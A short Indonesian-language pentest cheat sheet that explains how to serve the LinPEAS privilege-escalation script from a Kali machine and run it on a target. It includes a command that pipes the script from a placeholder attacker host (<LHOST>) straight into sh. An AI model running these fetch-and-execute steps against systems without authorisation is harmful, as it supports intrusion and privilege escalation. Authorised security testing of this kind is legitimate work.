# LinPEAS (Otomatis)

## Sumber
- GitHub: https://github.com/peass-ng/PEASS-ng (download `linpeas.sh`)
- Di Kali: `/usr/share/peass/linpeas/linpeas.sh` (paket `peass`)
- Atau jalankan `locate linpeas`

## Transfer ke Target
```bash
# Di Kali: jalankan web server
python3 -m http.server 8089

# Di target:
wget http://<LHOST>:8089/linpeas.sh -O /tmp/linpeas.sh
# atau
curl http://<LHOST>:8089/linpeas.sh | sh
```

## Eksekusi
```bash
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/out.txt
```

Baca highlight **MERAH/KUNING** untuk temuan penting.
